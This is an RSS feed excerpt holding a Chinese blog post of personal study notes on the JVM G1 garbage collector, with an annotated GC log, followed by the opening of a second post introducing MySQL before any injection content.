&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dukne2nj31b10u0hdt.jpg&quot; alt=&quot;image-20200219080118259&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dvnd215j31bl0u0hdt.jpg&quot; alt=&quot;image-20200219080219989&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;G1 ： 垃圾优先。 即首先收集垃圾最多的分区。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dyfyb9kj31w20ske3k.jpg&quot; alt=&quot;image-20200219080501983&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;新生代满的时候，G1 对整个新生代进行回收。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dz8tziij31xc0o017b.jpg&quot; alt=&quot;image-20200219080549430&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;收集集合cset&quot;&gt;收集集合（CSet）&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1dznvsusj31v80ry7n6.jpg&quot; alt=&quot;image-20200219080612134&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;CSet：一组将要被回收的空间的集合。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;已记忆集合rset&quot;&gt;已记忆集合（RSet）&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1e0ye7lyj31nv0u0kgd.jpg&quot; alt=&quot;image-20200219080727462&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1e2io2jaj31bg0u0nlz.jpg&quot; alt=&quot;image-20200219080856614&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;RSet 存在的原理及价值。如上图所示，记录了Region中的引用关系。使得垃圾收集器不需要扫描整个堆找谁引用了当前分区中的对象，只需要扫描RSet即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1e4n5hzij31hi0u0b29.jpg&quot; alt=&quot;image-20200219081057890&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;Points-into ：代表谁指向了我；&lt;/p&gt;
&lt;p&gt;Point-out: 我指向了谁&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;satbsnapshot-at-the-beginning起始快照&quot;&gt;SATB（Snapshot-At-The-Beginning）起始快照&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1e7ki3qjj31us0tih2s.jpg&quot; alt=&quot;image-20200219081349357&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;g1垃圾收集器官方文档解读&quot;&gt;G1垃圾收集器官方文档解读&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;https://www.oracle.com/technetwork/tutorials/tutorials-1876574.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;g1垃圾收集器深度理论讲解&quot;&gt;G1垃圾收集器深度理论讲解&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;G1 是将来Oracle HotSpot的未来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;又开始卡了，图片放的太多了。哈哈哈哈。快结束了，坚持住。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1jyb5xo9j31fi0u01ky.jpg&quot; alt=&quot;image-20200219113229630&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;g1的适合场景&quot;&gt;G1的适合场景&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1k6wra9qj320q0osazh.jpg&quot; alt=&quot;image-20200219114045574&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;g1-gc模式&quot;&gt;G1 GC模式&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1k93q5ayj31ed0u07wh.jpg&quot; alt=&quot;image-20200219114251559&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;global concurrent marking 全局并行标记&lt;/p&gt;
&lt;p&gt;G1只有 Young GC 和 Mixed GC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kd8trl1j31vm0u01kx.jpg&quot; alt=&quot;image-20200219114650369&quot;/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;G1是不提供Full GC的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;global-concurrent-marking&quot;&gt;global concurrent marking&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kfe7dw6j31v20mc1kx.jpg&quot; alt=&quot;image-20200219114855269&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kge6kdrj31br0u0e82.jpg&quot; alt=&quot;image-20200219114951967&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kjbh1f6j31q40u0kfu.jpg&quot; alt=&quot;image-2020021911215242055&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;g1-在运行过程中的主要模式&quot;&gt;G1 在运行过程中的主要模式&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kkbpk98j31zw0r8n9m.jpg&quot; alt=&quot;image-20200219115340259&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;并发阶段，指的是全局并发标记的阶段&lt;/p&gt;
&lt;p&gt;混合模式，指的是 Mixed GC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kkwsv7gj31uk0q2aoo.jpg&quot; alt=&quot;image-20200219115414291&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;mixed-gc的参数详解&quot;&gt;Mixed GC的参数详解&lt;/h5&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;什么时候发生Mixed GC&lt;/p&gt;
&lt;p&gt;由一些参数控制，另外也控制着哪些老年代Region会被选入CSet当中&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kn53f0bj31os0u01fu.jpg&quot; alt=&quot;image-20200219115622574&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kr0fhayj31um0m2tls.jpg&quot; alt=&quot;image-20200219120006252&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;垃圾占比已经超过此参数设定的值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kugv2udj31rm0lgk27.jpg&quot; alt=&quot;image-20200219120325434&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1kvvogsyj31j90u0kbn.jpg&quot; alt=&quot;image-20200219120446748&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1n4r8pzmj31bv0u0npe.jpg&quot; alt=&quot;image-20200219132227828&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1n506q2sj318w0u0qv6.jpg&quot; alt=&quot;image-20200219132242454&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1n6idbr2j31a30u0hdu.jpg&quot; alt=&quot;image-20200219132409136&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1n7t01kbj31ng0u0npd.jpg&quot; alt=&quot;image-20200219132524622&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1p3aramfj31b20u0h14.jpg&quot; alt=&quot;image-20200219143018081&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;上图描述了RSet的记录情况，存放各个引用关系。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1p54afc3j31tz0u0b29.jpg&quot; alt=&quot;image-20200219143202741&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1p6pimyuj31ai0u0u0y.jpg&quot; alt=&quot;image-20200219143332001&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1p869kd4j317w0u0npe.jpg&quot; alt=&quot;image-20200219143456786&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1pa1b8t0j31et0u01ky.jpg&quot; alt=&quot;image-20200219143645002&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;RSet其实是一个Hash Tabella，key 是引用它的起始地址，value是一个集合，元素是card table 的index。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1paogv31j31bs0u07wh.jpg&quot; alt=&quot;image-20200219143722790&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1pb8v6rzj31uc0lekc1.jpg&quot; alt=&quot;image-20200219143756710&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;混合GC， 不仅进行正常的新生代垃圾收集，同时也回收部分后台扫描线程标记的老年代分区。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc2qcb70fsj31ak0jmqfb.jpg&quot; alt=&quot;image-20200220115905110&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1pckurv5j31u00sq4qp.jpg&quot; alt=&quot;image-20200219143913072&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1pduqdwfj31c20u0e82.jpg&quot; alt=&quot;image-20200219144024812&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;三色标记算法黑白灰&quot;&gt;三色标记算法（黑白灰）&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;在进行并发标记时出现的标记错误的情况。而出来的算法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1per4fn5j31ve0ni1kx.jpg&quot; alt=&quot;image-20200219144118388&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1pkvr0abj31d90u0u0x.jpg&quot; alt=&quot;image-20200219144710680&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;被标记，意思是可达的对象。被标记的对象都不应该被回收掉，都不是垃圾。&lt;/p&gt;
&lt;p&gt;没有被标记的才是垃圾。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1qv6n2iej31880u0h3m.jpg&quot; alt=&quot;image-20200219153141626&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1qwn1e72j31hn0u04gt.jpg&quot; alt=&quot;image-20200219153306004&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1qz8jtvij31j50u01j4.jpg&quot; alt=&quot;image-20200219153535527&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;三色标记算法在并发情况下的漏标问题分析&quot;&gt;三色标记算法在并发情况下的漏标问题分析。&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1r1mzkgzj31r60nob0o.jpg&quot; alt=&quot;image-20200219153753559&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1r22d9jtj316n0u0ww7.jpg&quot; alt=&quot;image-20200219153817891&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1r2vpt1vj31nc0ic7km.jpg&quot; alt=&quot;image-20200219153905751&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1r4cac5gj31er0u07oi.jpg&quot; alt=&quot;image-20200219154029727&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此时。C也不应该被垃圾回收。&lt;/p&gt;
&lt;h4 id=&quot;satb&quot;&gt;SATB&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1rmh9bo2j31us0q81dw.jpg&quot; alt=&quot;image-20200219155752707&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1rmuzseij31kz0u0e81.jpg&quot; alt=&quot;image-20200219155817076&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1rrpbe3sj31e70u07wi.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1rzxcdarj31cp0u04qq.jpg&quot; alt=&quot;image-20200219161048878&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1s0jixccj31bu0u01ky.jpg&quot; alt=&quot;image-20200219161124751&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1s81bzpnj31fy0u04qq.jpg&quot; alt=&quot;image-20200219161837501&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1samtkqtj31i40u0u0x.jpg&quot; alt=&quot;image-20200219162107459&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1sc1k97gj31ek0u0e82.jpg&quot; alt=&quot;image-20200219162224465&quot;/&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1sg8i2bmj31v00o81kx.jpg&quot; alt=&quot;image-20200219162630745&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1sgmmbq8j31b90u0kjm.jpg&quot; alt=&quot;image-20200219162652666&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1sna3lnjj315e0juav5.jpg&quot; alt=&quot;image-20200219163318289&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;灰色移除的目标标记为灰色。黑色引用新产生的对象标记为黑色&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1sonyz3uj31820gk4bb.jpg&quot; alt=&quot;image-20200219163437779&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;误标没什么关系，但是漏标的结果是致命的，影响线程的正确性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1spg610sj317g0kcne0.jpg&quot; alt=&quot;image-20200219163523280&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1syf5r5rj31jn0u0npd.jpg&quot; alt=&quot;image-20200219164359738&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;针对于是上一个问题 的解决方案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1t95y0yej31rj0u0npd.jpg&quot; alt=&quot;image-20200219165415827&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1tb10thjj31vm0rwhdt.jpg&quot; alt=&quot;image-20200219165605864&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;g1的收集模式&quot;&gt;G1的收集模式&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1tcnitddj31uu0u0b29.jpg&quot; alt=&quot;image-20200219165739537&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1td8l8y8j31fl0u0npd.jpg&quot; alt=&quot;image-20200219165810130&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1tf6k3ccj31dc0u0e82.jpg&quot; alt=&quot;image-20200219170003558&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;g1的最佳实践&quot;&gt;G1的最佳实践&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc1twn47xbj31bs0u0npe.jpg&quot; alt=&quot;image-20200219171651815&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;暂停时间设置的太短，就会导致出现G1跟不上垃圾产生的速度，最终退化成Full GC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc20vtsrcmj31ds0u07wi.jpg&quot; alt=&quot;image-20200219211816198&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gc20xwhz19j31v20s84qp.jpg&quot; alt=&quot;image-20200219212017987&quot;/&gt;&lt;/p&gt;
&lt;p&gt;每天写业务代码，怎么能和别人拉开距离。&lt;/p&gt;
&lt;p&gt;确定了一个待研究的主题，对这个主题进行全方面的剖析。高注意力的研究一个主题。&lt;/p&gt;
&lt;h4 id=&quot;g1回收器日志内容详细分析&quot;&gt;G1回收器日志内容详细分析&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;VM options： 
  -verbose:gc 
  -Xms10m
  -Xmx10m       
  -XX:+UseG1GC  //使用G1的垃圾回收器
  -XX:+PrintGCDetails 
  -XX:+PrintGCDateStamps 
  -XX:MaxGCPauseMillis=200  // 指定最大的回收时间

public class MyTest1 {
    public static void main(String[] args) {
        int size = 1024 * 1024; // 1M 的容量
        byte[] myAlloc1  = new byte[size]; // 创建之后每一个元素都是0
        byte[] myAlloc2  = new byte[size]; // 创建之后每一个元素都是0
        byte[] myAlloc3  = new byte[size]; // 创建之后每一个元素都是0
        byte[] myAlloc4  = new byte[size]; // 创建之后每一个元素都是0
        System.out.println(&quot;hello world &quot;);
    }
}

&amp;gt; 使用G1之后的打印内容
&amp;gt; Task :MyTest1.main()
2020-02-21T05:25:01.316-0800: [GC pause (G1 Humongous Allocation) (young) (initial-mark), 0.0012901 secs]  // 针对于年轻代的GC的5个阶段
   [Parallel Time: 0.7 ms, GC Workers: 13]  // 有13个线程进行回收
      [GC Worker Start (ms): Min: 65.2, Avg: 65.3, Max: 65.3, Diff: 0.1]
      [Ext Root Scanning (ms): Min: 0.2, Avg: 0.3, Max: 0.5, Diff: 0.3, Sum: 4.4]//1.根扫描
      [Update RS (ms): Min: 0.0, Avg: 0.0, Max: 0.0, Diff: 0.0, Sum: 0.0]//2.更新RS。 记忆集合
         [Processed Buffers: Min: 0, Avg: 0.0, Max: 0, Diff: 0, Sum: 0] //3.处理RS
      [Scan RS (ms): Min: 0.0, Avg: 0.0, Max: 0.0, Diff: 0.0, Sum: 0.0]
      [Code Root Scanning (ms): Min: 0.0, Avg: 0.0, Max: 0.0, Diff: 0.0, Sum: 0.0]//跟扫描时间
      [Object Copy (ms): Min: 0.1, Avg: 0.1, Max: 0.2, Diff: 0.2, Sum: 1.7]//4.对象拷贝的时间
      [Termination (ms): Min: 0.0, Avg: 0.0, Max: 0.0, Diff: 0.0, Sum: 0.0]//5.处理引用队列
         [Termination Attempts: Min: 1, Avg: 2.3, Max: 5, Diff: 4, Sum: 30]
        // 下边三行，总结性的信息
      [GC Worker Other (ms): Min: 0.0, Avg: 0.0, Max: 0.1, Diff: 0.1, Sum: 0.4]
      [GC Worker Total (ms): Min: 0.4, Avg: 0.5, Max: 0.6, Diff: 0.1, Sum: 6.5]
      [GC Worker End (ms): Min: 65.8, Avg: 65.8, Max: 65.8, Diff: 0.0]
   [Code Root Fixup: 0.0 ms]
   [Code Root Purge: 0.0 ms]
   [Clear CT: 0.1 ms]  // CT： care table  卡表
   [Other: 0.4 ms]
      [Choose CSet: 0.0 ms]  //选择 回收集合
      [Ref Proc: 0.2 ms] //引用的处理时间
      [Ref Enq: 0.0 ms] 
      [Redirty Cards: 0.1 ms]
      [Humongous Register: 0.0 ms]
      [Humongous Reclaim: 0.0 ms]
      [Free CSet: 0.0 ms]
   [Eden: 1024.0K(6144.0K)-&amp;gt;0.0B(2048.0K) Survivors: 0.0B-&amp;gt;1024.0K Heap: 2663.2K(10240.0K)-&amp;gt;2640.1K(10240.0K)] //执行完一个young GC之后的结果汇总。 Eden全部被清空。 一个对象进入Survivors
 [Times: user=0.00 sys=0.00, real=0.00 secs]   
// 并发处理的过程 （比老师学习视频中的过程，少了一次年轻代的收集）
2020-02-21T05:25:01.317-0800: [GC concurrent-root-region-scan-start]
2020-02-21T05:25:01.318-0800: [GC concurrent-root-region-scan-end, 0.0002879 secs]
2020-02-21T05:25:01.318-0800: [GC concurrent-mark-start]
2020-02-21T05:25:01.318-0800: [GC concurrent-mark-end, 0.0000480 secs]
2020-02-21T05:25:01.318-0800: [GC remark 2020-02-21T05:25:01.318-0800: [Finalize Marking, 0.0002741 secs] 2020-02-21T05:25:01.318-0800: [GC ref-proc, 0.0000487 secs] 2020-02-21T05:25:01.318-0800: [Unloading, 0.0003851 secs], 0.0008481 secs]
 [Times: user=0.01 sys=0.00, real=0.00 secs] 
2020-02-21T05:25:01.319-0800: [GC cleanup 4688K-&amp;gt;4688K(10240K), 0.0004242 secs]
 [Times: user=0.00 sys=0.00, real=0.00 secs] 
hello world 
Heap
  // G1总的大小是10240K   
 garbage-first heap   total 10240K, used 4688K [0x00000007bf600000, 0x00000007bf700050, 0x00000007c0000000)
// Region size 的初始大小为 1024k                                                 
  region size 1024K, 2 young (2048K), 1 survivors (1024K)
 // 元空间的大小                                               
 Metaspace       used 2805K, capacity 4486K, committed 4864K, reserved 1056768K
  class space    used 291K, capacity 386K, committed 512K, reserved 1048576K&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;两个问题。&lt;/p&gt;
&lt;ol readability=&quot;0&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;在Java当中，一个全局变量会被初始化几次。 （问的问题不对。Java当中承担全局变量的是静态变量）&amp;gt; 静态变量只会被初始化一次，在类加载器初始化的时候，静态变量会被首先初始化。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Java当中的泛型是怎么实现的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;强引用，软引用，弱引用，虚引用等概念。&lt;/p&gt;
&lt;p&gt;https://www.cnblogs.com/yngjian/p/12059428.html&lt;/p&gt;
&lt;h2 id=&quot;基础的重要性&quot;&gt;基础的重要性。&lt;/h2&gt;
&lt;p&gt;谁都会忘，忘了去复习就好了。自己复习自己的笔记，能够瞬间勾起你的回忆。&lt;/p&gt;
&lt;p&gt;学习，为什么不可以去看官方文档学习呢？看不懂英文的吗？&lt;/p&gt;
&lt;p&gt;要知道，老师们讲的顺序都是按照官网的顺序来的。&lt;/p&gt;
&lt;p&gt;总结，复习。有来有回。复盘。&lt;/p&gt;
&lt;p&gt;2020年02月21日07:57:58 整理笔记结束。原来这里边只能有一个一级标题。重新整理了两遍。哈哈哈&lt;/p&gt;



&lt;div class=&quot;postDesc&quot;&gt;posted @ &lt;span id=&quot;post-date&quot;&gt;2020-02-21 07:59&lt;/span&gt;  &lt;a href=&quot;https://www.cnblogs.com/wobushitiegan/&quot;&gt;我不是铁杆啊&lt;/a&gt;  阅读(&lt;span id=&quot;post_view_count&quot;&gt;...&lt;/span&gt;)  评论()  &lt;a href=&quot;https://i.cnblogs.com/EditPosts.aspx?postid=12340091&quot; rel=&quot;nofollow&quot;&gt;编辑&lt;/a&gt;  &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;AddToWz(12340091);return false;&quot;&gt;收藏&lt;/a&gt;&lt;/div&gt;







&lt;/body&gt;</description>
<pubDate>Thu, 20 Feb 2020 23:59:00 +0000</pubDate>
<dc:creator>我不是铁杆啊</dc:creator>
<og:description>深入理解JVM 这，仅是我学习过程中记录的笔记。确定了一个待研究的主题，对这个主题进行全方面的剖析。笔记是用来方便我回顾与学习的，欢迎大家与我进行交流沟通，共同成长。不止是技术。 2020年02月06</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wobushitiegan/p/12340091.html</dc:identifier>
</item>
<item>
<title>对MYSQL注入相关内容及部分Trick的归类小结 - Yunen的博客</title>
<link>http://www.cnblogs.com/yunen/p/12340072.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yunen/p/12340072.html</guid>
<description>&lt;p&gt;最近在给学校的社团成员进行web安全方面的培训，由于在mysql注入这一块知识点挺杂的，入门容易，精通较难，网上相对比较全的资料也比较少，大多都是一个比较散的知识点，所以我打算将我在学习过程中遇到的关于的mysql注入的内容给全部罗列出来，既方便个人之后的复习，也方便后人查找相关资料。&lt;/p&gt;
&lt;p&gt;本文部分内容可能会直接截取其他大牛的文章，截取的内容我都会进行声明处理。如有侵权，请发email联系我(asp-php#foxmail.com)删除。&lt;/p&gt;
&lt;p&gt;本文首发于先知社区，转载需注明来源+作者ID：Yunen。&lt;/p&gt;

&lt;p&gt;在正式讲解mysql注入的内容前，我认为还是有必要说明一下什么是mysql、mysql的特点是什么等内容，这些东西看起来可能对注入毫无帮助，开始却能很好的帮助我们学习，融会贯通。&lt;/p&gt;
&lt;blockquote readability=&quot;9.7268907563025&quot;&gt;
&lt;p&gt;MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种&lt;strong&gt;关联数据库管理系统&lt;/strong&gt;，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;MySQL是&lt;strong&gt;开源&lt;/strong&gt;的，所以你不需要支付额外的费用。&lt;/li&gt;
&lt;li&gt;MySQL使用&lt;strong&gt;标准的 SQL 数据语言&lt;/strong&gt;形式。&lt;/li&gt;
&lt;li&gt;MySQL可以运行于多个系统上，并且&lt;strong&gt;支持多种语言&lt;/strong&gt;。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。&lt;/li&gt;
&lt;li&gt;MySQL&lt;strong&gt;对PHP有很好的支持&lt;/strong&gt;，PHP 是目前最流行的 Web 开发语言。&lt;/li&gt;
&lt;li&gt;MySQL&lt;strong&gt;支持大型数据库&lt;/strong&gt;，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。&lt;/li&gt;
&lt;li&gt;MySQL是&lt;strong&gt;可以定制的&lt;/strong&gt;，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;引自：&lt;a href=&quot;https://www.runoob.com/mysql/mysql-tutorial.html&quot;&gt;Mysql教程 | 菜鸟教程&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一个完整的mysql管理系统结构通常如下图：&lt;/p&gt;
